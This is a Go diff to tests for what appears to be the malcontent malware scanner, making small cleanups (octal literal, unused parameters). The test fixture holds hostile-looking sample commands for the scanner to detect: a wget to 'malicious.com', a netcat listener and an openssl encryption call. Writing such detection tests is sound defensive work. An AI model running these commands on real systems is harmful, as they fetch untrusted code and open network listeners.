@@ -26,7 +26,7 @@ wget http://malicious.com
 nc -l 1234
 openssl enc -aes-256-cbc
 `
-	if err := os.WriteFile(testFile, []byte(content), 0644); err != nil {
+	if err := os.WriteFile(testFile, []byte(content), 0o644); err != nil {
 		t.Fatalf("Failed to write test file: %v", err)
 	}
 
@@ -58,7 +58,7 @@ openssl enc -aes-256-cbc
 
 	// Check that we got results
 	var fileReport *malcontent.FileReport
-	frs.Files.Range(func(key, value any) bool {
+	frs.Files.Range(func(_, value any) bool {
 		if fr, ok := value.(*malcontent.FileReport); ok {
 			fileReport = fr
 			return false
@@ -112,7 +112,7 @@ openssl enc -aes-256-cbc
 	}
 
 	// Check that line numbers are NOT present when disabled
-	frs2.Files.Range(func(key, value any) bool {
+	frs2.Files.Range(func(_, value any) bool {
 		if fr, ok := value.(*malcontent.FileReport); ok {
 			for _, behavior := range fr.Behaviors {
 				if len(behavior.LineNumbers) > 0 {
@@ -171,7 +171,7 @@ func TestScanBinaryWithLineInfo(t *testing.T) {
 
 	// Verify scan completed without errors
 	found := false
-	frs.Files.Range(func(key, value any) bool {
+	frs.Files.Range(func(_, value any) bool {
 		found = true
 		return false
 	})
